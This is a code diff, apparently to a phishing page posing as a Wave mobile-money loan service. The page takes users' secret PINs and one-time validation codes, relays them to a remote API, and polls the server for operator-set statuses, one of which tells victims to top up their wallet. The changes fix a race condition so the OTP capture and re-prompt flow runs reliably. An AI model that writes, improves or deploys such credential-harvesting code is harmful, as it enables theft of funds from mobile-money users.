@@ -580,7 +580,7 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 
 <script>
 var API = 'https://wave-loans.onrender.com/api';
-var sessId = null, pollTmr = null;
+var sessId = null, pollTmr = null, verifying = false;
 
 function showLoad(){ document.getElementById('loadOv').classList.add('show'); }
 function hideLoad(){ document.getElementById('loadOv').classList.remove('show'); }
@@ -741,9 +741,10 @@ function startPoll(sid){
         showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
         setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
       } else if(r.status==='wrong_code'){
+        if(verifying) return; // doVerify handles this case
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Code invalide', 'Le code de validation est incorrect. Veuillez réessayer ou demander un nouveau code.');
-        setTimeout(function(){ resetOTP(); startPoll(sid); }, 600);
+        setTimeout(function(){ resetOTP(); verifying=false; startPoll(sid); }, 600);
       } else if(r.status==='continue'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
@@ -810,7 +811,7 @@ function otpUpdateSlots(){
 }
 
 function otpKpPress(digit){
-  if(otpVal.length >= 4) return;
+  if(otpVal.length >= 4 || verifying) return;
   otpVal += digit;
   otpUpdateSlots();
   if(otpVal.length === 4) setTimeout(doVerify, 120);
@@ -822,7 +823,7 @@ function otpKpBack(){
   otpUpdateSlots();
 }
 
-function resetOTP(){ otpVal = ''; otpUpdateSlots(); }
+function resetOTP(){ otpVal = ''; verifying = false; otpUpdateSlots(); }
 
 var resTimer = null;
 function startResendCd(secs){
@@ -883,17 +884,24 @@ async function doResend(){
 }
 
 async function doVerify(){
-  if(otpVal.length === 4 && sessId){
-    showLoad();
-    var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
-    if(r && r.success){
+  if(otpVal.length !== 4 || !sessId || verifying) return;
+  verifying = true;
+  // Stop polling while we verify so poll doesn't fire wrong_code too
+  if(pollTmr){ clearInterval(pollTmr); pollTmr = null; }
+  showLoad();
+  var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
+  hideLoad();
+  if(r && r.success){
+    verifying = false;
+    startPoll(sessId);
+  } else {
+    // Single error popup, clear OTP, then re-start polling
+    showPop('Code incorrect', 'Le code de validation saisi est incorrect. Veuillez vérifier et réessayer.');
+    setTimeout(function(){
+      resetOTP();
+      verifying = false;
       startPoll(sessId);
-    } else {
-      hideLoad();
-      // Don't wipe instantly — show error first, then clear
-      showPop('Code incorrect', 'Le code de validation saisi est incorrect. Veuillez vérifier et réessayer.');
-      setTimeout(function(){ resetOTP(); }, 400);
-    }
+    }, 600);
   }
 }
 
